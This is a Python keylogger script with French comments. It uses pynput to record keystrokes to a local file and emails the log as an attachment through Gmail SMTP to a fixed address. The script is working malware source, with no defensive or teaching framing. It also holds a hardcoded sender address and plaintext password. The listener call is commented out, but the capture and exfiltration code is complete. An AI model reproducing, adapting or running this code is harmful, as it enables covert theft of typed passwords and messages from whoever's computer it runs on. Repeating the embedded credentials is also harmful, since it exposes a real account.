from pynput.keyboard import Key, Listener
import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
import socket
import smtplib

# Date actuelle de sauvegarde du fichier : eg. : 2020-09-17 09:26:13
date_time = datetime.datetime.now().strftime(("%Y-%m-%d : %H-%M-%S"))

# Variables :
keys = []

filename = 'myfile.txt'
file = open(filename, 'a+')
file.write("\n\n" + date_time + "\n")


print(date_time)

def on_press(key):
    global keys
    keys.append(str(key).replace("'", ""))
    print(keys[-1])
    if len(keys) > 10:
        write_keys(keys)
        keys = []

def write_keys(keys):
    for key in keys:
        if key == 'Key.enter':  # for enter it write a new line.
                file.write("\n")
        elif key == 'Key.space':#for space it will enter a space
            file.write(key.replace("Key.space"," "))
        elif key == 'Key.backspace':#for backspace it will enter a $
            # EX. well$come --> welcome (Actual word) , another example hellll$$$o --> helo (actual word) [hope it helps you to understand]
            file.write(key.replace("Key.backspace", "$"))
        else:
            file.write(key)

def on_release(key):
    if (key == Key.esc):
        file.close()
        send_email()
        return False

# also write the function to check internet connection
# so it help to call sendmail function when internet is wroking

def is_connected():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False

def send_email():
    fromaddr = "quentin.rivollat@gmail.com"
    toaddr = "quentin.rivollat@etu.unige.ch"
    password = "U2hW3vc5"

    msg = MIMEMultipart()
    # storing the senders email address
    msg['From'] = fromaddr
    # storing the receivers email address
    msg['To'] = toaddr
    # storing the subject
    msg['Subject'] = "data"
    # string to store the body of the mail
    body = "TEXT YOU WANT TO SEND"
    # attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))
    # open the file to be sent
    attachment = open(filename, "rb")
    # instance of MIMEBase and named as part
    part = MIMEBase('application', 'octet-stream')
    # To change the payload into encoded form
    part.set_payload((attachment).read())
    # encode into base64
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',
                    "attachment; filename= %s" % filename)
    # attach the instance 'part' to instance 'msg'
    msg.attach(part)
    # creates SMTP session
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    # start TLS for security
    server.starttls()
    # Authentication
    server.login(fromaddr, password)
    # Converts the Multipart msg into a string
    text = msg.as_string()
    # sending the mail
    server.sendmail(fromaddr, toaddr, text)
    # terminating the session
    server.quit()

# with Listener(on_press=on_press, on_release=on_release) as listener:
#     listener.join()

send_email()